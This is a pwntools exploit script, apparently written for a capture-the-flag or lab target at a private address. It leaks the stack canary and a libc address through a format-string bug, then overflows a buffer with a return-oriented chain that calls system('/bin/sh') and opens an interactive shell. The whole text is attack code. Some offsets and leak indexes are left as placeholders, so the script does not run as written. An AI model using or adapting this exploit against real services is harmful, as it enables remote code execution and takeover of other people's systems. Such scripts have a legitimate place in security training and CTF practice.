from pwn import *

# Context setup for Ubuntu 20.04 (glibc 2.31)
context.arch = 'amd64'

# Load provided binaries to automatically parse offsets
elf = ELF('./binary')  # Replace with actual binary name
libc = ELF('./libc.so.6')

# Establish connection
io = remote('10.10.0.2', 1339)

# ==========================================
# STAGE 1: The Leak (Format String)
# ==========================================
# Example: Send format string tokens to dump stack locations
# You will need to determine the exact index numbers via local debugging (e.g., %11$p, %13$p)
payload_leak = b"%p." * 20 

io.sendlineafter(b"name", payload_leak)
leak_data = io.recvline().decode().split('.')

# Log out leaks to inspect them
log.info(f"Stack Leak: {leak_data}")

# Assuming you identified the indexes:
# canary = int(leak_data[canary_index], 16)
# libc_leak = int(leak_data[libc_index], 16)

# Calculate Libc Base (Example offset, replace with actual)
# libc.address = libc_leak - libc.sym['__libc_start_main_ret'] 

log.success(f"Libc Base: {hex(libc.address)}")

# ==========================================
# STAGE 2: The Hijack (Buffer Overflow)
# ==========================================
# Find standard gadgets
rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0] # Required for 16-byte stack alignment in glibc 2.31

# Build the ROP chain
payload = b"A" * offset_to_canary
payload += p64(canary)
payload += b"B" * 8 # Overwrite saved RBP
payload += p64(RET) # Align stack
payload += p64(POP_RDI)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym['system'])

# Send the final payload to the passphrase prompt
io.sendlineafter(b"passphrase", payload)

# Drop to interactive shell
io.interactive()
